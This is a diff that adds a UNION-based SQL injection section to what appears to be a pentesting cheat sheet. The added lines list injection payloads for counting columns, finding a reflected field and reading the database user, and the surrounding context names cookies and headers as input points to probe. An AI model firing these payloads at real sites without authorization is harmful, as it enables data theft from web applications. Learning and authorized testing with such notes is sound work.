@@ -33,3 +33,21 @@ SELECT Name, Description FROM Products WHERE ID='1'--
 
 ##### Common Locations To Check For SQLi
 > Check places that take users input like Cookies, User-Agent, Accept-Language, GET, POST params, etc.
+
+##### Exploiting UNION BASED SQLi
+
+```
+id='UNION SELECT null;-- - >> Error
+
+Finding No of Fields
+id='UNION SELECT null,null,null;-- - >> Use Hit and Trial until something changes
+
+id='UNION SELECT null,null;-- - >> Change is Seen
+
+id='UNION SELECT 'foo','bar';-- - >> Check reflected Field lets assume foo gets reflected. 
+```
+
+##### Quering User
+```
+id='UNION SELECT user(), 'bar';-- - >> user@localhost
+```
